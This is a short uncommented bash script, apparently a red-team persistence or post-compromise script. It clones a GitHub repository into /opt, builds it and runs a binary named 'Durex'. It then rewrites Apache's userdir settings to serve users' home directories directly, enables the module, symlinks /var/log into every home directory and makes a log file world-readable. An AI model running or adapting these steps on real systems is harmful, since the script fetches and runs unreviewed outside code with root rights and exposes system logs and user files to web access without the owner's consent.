#!/bin/bash
cd /opt
rm -rf icu
git clone https://github.com/dbaseqp/icu
cd icu

make
./Durex
cd ..
# rm -rf ./icu
conf='/etc/apache2/mods-available/userdir.conf'
sed -i 's/public_html/./g' $conf
sed -i 's/.*disabled.*//g' $conf

a2enmod userdir 1>/dev/null
systemctl restart apache2
ls /home | xargs -I{} ln -sf /var/log /home/{}
chmod +r /var/log/cpu-manager